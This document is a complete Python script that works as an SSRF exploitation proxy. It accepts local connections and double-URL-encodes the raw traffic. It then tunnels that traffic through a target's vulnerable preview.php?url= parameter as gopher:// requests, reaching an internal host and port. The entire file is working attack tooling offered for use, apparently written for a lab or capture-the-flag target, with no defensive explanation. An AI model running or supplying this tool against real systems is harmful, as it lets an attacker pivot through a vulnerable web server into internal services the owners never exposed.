#!/usr/bin/env python3

import socket
import requests
import urllib.parse
import threading
import argparse

def handle_client(conn, addr, target_host, host_to_proxy, port_to_proxy):
    with conn:
        data = conn.recv(65536)
        if not data:
            return

        # Double URL encode للـ payload
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))

        target_url = (
            f"http://{target_host}/preview.php?url="
            f"gopher://{host_to_proxy}:{port_to_proxy}/_{double_encoded_data}"
        )

        try:
            resp = requests.get(target_url, timeout=10)
            conn.sendall(resp.content)
        except Exception as e:
            print(f"[!] Error forwarding request: {e}")
            conn.sendall(b"Proxy error")

def main():
    parser = argparse.ArgumentParser(description="Python proxy for SSRF gopher tunneling")
    parser.add_argument("--lhost", required=True, help="Local listen host (e.g., 127.0.0.1)")
    parser.add_argument("--lport", type=int, required=True, help="Local listen port (e.g., 4002)")
    parser.add_argument("--target", required=True, help="Host with SSRF (e.g., 10.80.169.40)")
    parser.add_argument("--phost", required=True, help="Internal host (e.g., 127.0.0.1)")
    parser.add_argument("--pport", type=int, required=True, help="Internal port (e.g., 10000)")

    args = parser.parse_args()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((args.lhost, args.lport))
        s.listen()
        print(f"[*] Listening on {args.lhost}:{args.lport}, proxying to {args.phost}:{args.pport} via {args.target}...")

        while True:
            conn, addr = s.accept()
            client_thread = threading.Thread(
                target=handle_client,
                args=(conn, addr, args.target, args.phost, args.pport),
                daemon=True,
            )
            client_thread.start()

if __name__ == "__main__":
    main()
